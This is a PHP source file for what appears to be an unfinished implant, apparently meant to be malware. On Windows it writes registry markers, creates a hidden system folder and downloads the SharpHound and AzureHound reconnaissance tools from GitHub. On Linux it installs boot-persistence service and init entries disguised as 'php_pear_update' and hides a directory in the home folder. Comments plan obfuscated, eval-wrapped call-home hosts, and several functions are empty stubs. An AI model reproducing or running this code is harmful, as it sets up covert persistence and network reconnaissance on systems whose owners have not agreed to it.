<?php
ini_set("safe_mode", 0);
umask(0);
posix_setuid(0);
define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);

function checkfs(){
    if (substr(php_uname(), 0, 7) == 'Windows') {
        $wh = new COM('WScript.Shell');
        if (is_null($wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Path"))) {
            $t = sys_get_temp_dir() . "\\" . substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);
            $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Version", "REG_SZ", "1");
            $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerPath", "REG_SZ", base64_encode($t));
            $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerHash", "REG_SZ", substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 48));
            shell_exec("mkdir " . $t);
            shell_exec("attrib +h +s " . $t);
            shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile " . $t . "\\af.ps1");
            shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile " . $t . "\\af1.ps1");
            shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile " . $t . "\\af2.exe");
            return $t;
        }else{
            return $wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerHash");
        }
    } else {
        $uuid = substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);
        if (is_dir("/etc/service") && !file_exists("/etc/service/php_pear_update_service")){
            $f = fopen("/etc/service/php_pear_update", "w");
            fwrite($f, "#!/bin/sh\nexec $(which php) ". SELF_SCRIPT);
            fflush($f);
            fclose($f);
        }elseif (is_dir("/etc/init/") && !file_exists("/etc/init/phpworker.conf")){
            $ff = fopen("/etc/init/phpworker.conf", "w");
            fwrite($ff, "start on startup\nstop on shutdown\nrespawn\nrespawn limit 20 5\nscript\n\t[\$(exec $(which php) -f ". SELF_SCRIPT . ") = 'ERROR'] && ( stop; exit 1; )");
            fflush($ff);
            fclose($ff);
        }elseif (is_dir("/var/service") && !file_exists("/var/service/php_pear_update_service/run")){
            $ffe = fopen("/var/service/php_pear_update/run", "w");
            fwrite($ffe, "#!/bin/sh\nexec setuidgid sh -c 'exec $(which php) ". SELF_SCRIPT ."'");
            fflush($ffe);
            fclose($ffe);
        }

        $uuid = substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);
        $myhom = "\$HOME/.local/.backup/.pear/";
        if (!is_dir($myhom)) {
            shell_exec("mkdir -p $myhom");
            $uif = fopen("$myhom" . ".pear_hash_backup", "a");
            fwrite($uif, $uuid);
            fflush($uif);
            fclose($uif);
            return $myhom;
        }else{
            $uif = fopen($myhom.".pear_hash_backup", "a");
            return fread($uif, "32");
        }
    }

}

function checkin_timer()
{

}

function watcher($lo){
    if (!empty($lo) && is_file($lo)){

    }
}

function fork_control(){


}

function main(){
    # need to set these from the client script.
    # these will be the hosts we call home to.
    # this needs to be encoded, wrapped in an eval command, and some rot done to it.
    $callHome = null;
    $duration = null;

}